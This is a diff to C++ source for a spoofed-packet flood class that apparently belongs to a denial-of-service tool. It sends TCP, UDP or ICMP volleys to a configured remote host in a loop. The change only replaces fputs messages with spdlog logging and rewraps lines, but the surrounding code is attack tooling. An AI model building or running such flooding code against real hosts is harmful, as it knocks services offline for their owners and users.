@@ -3,8 +3,10 @@
 
 #include <vector>
 
-base_spoofed_flood::base_spoofed_flood(std::shared_ptr<Config> config, int protocol) :
-                                        Vector(std::move(config)), proto{protocol} {
+#include <spdlog/spdlog.h>
+
+base_spoofed_flood::base_spoofed_flood(std::shared_ptr<Config> config,
+		int protocol) : Vector(std::move(config)), proto{protocol} {
     switch(proto){
         case IPPROTO_TCP:
         case IPPROTO_UDP:
@@ -14,7 +16,7 @@ base_spoofed_flood::base_spoofed_flood(std::shared_ptr<Config> config, int proto
             hdr_len = 400;
             break;
         default:
-            fputs("[-] protocol not found", stderr);
+            spdlog::get("logger")->error("protocol not found");
             exit(EXIT_FAILURE);
     }
 }
@@ -32,21 +34,24 @@ void base_spoofed_flood::run() {
                 socket->Close();
                 socket->Open();
             }
-            fputs("[+] Voly Sent\n", stderr);
+            spdlog::get("logger")->info("Voly Sent");
             delete[] hdr;
         }
         utils::pause(config->time);
     }
 }
 
-void base_spoofed_flood::init_sockets(std::vector<std::unique_ptr<Rsocket>> &sockets) {
+void base_spoofed_flood::init_sockets(
+		std::vector<std::unique_ptr<Rsocket>> &sockets) {
     sockets.reserve(config->conn);
     if(config->tls)
-        fputs("[-] tls is not available on spoofed packets\n", stderr);
+    	spdlog::get("logger")->error("tls is not available on spoofed packets");
 
     if(proto == IPPROTO_ICMP && config->rand_lport)
-        fputs("[-] local port randomization is not available on icmp\n", stderr);
+        spdlog::get("logger")->error(
+        		"local port randomization is not available on icmp");
 
     for(int i = 0; i < config->conn; ++i)
-        sockets.emplace_back(std::unique_ptr<Rsocket>(new Rsocket(config->rhost, config->rport, proto)));
+        sockets.emplace_back(std::unique_ptr<Rsocket>(new Rsocket(config->rhost,
+        		config->rport, proto)));
 }
